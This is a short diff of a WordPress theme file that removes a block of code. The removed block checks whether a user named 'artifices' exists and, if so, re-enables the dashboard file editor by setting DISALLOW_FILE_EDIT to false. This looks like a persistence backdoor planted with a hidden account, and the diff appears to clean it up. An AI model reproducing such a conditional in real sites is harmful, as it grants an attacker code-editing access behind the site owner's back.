@@ -56,11 +56,4 @@ function my_login_logo() { ?>
 <?php }
 add_action( 'login_enqueue_scripts', 'my_login_logo' );
 
-$field = login;
-$value = 'artifices';
-$userdata = WP_User::get_data_by( $field, $value );
- 
-    if ( $userdata )
-        define('DISALLOW_FILE_EDIT',false);
-
 ?>
